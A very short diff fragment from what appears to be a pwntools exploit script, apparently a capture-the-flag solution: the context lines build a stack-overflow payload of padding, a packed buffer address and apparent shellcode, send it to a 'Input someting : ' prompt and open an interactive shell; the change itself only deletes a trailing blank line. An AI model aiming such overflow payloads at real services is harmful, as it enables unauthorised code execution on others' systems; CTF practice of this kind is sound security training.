@@ -14,4 +14,3 @@ payload=b'a'*0x18+p64(buf_addr+0x20)+ash
 
 r.sendlineafter(b"Input someting : ",payload)
 r.interactive()
-
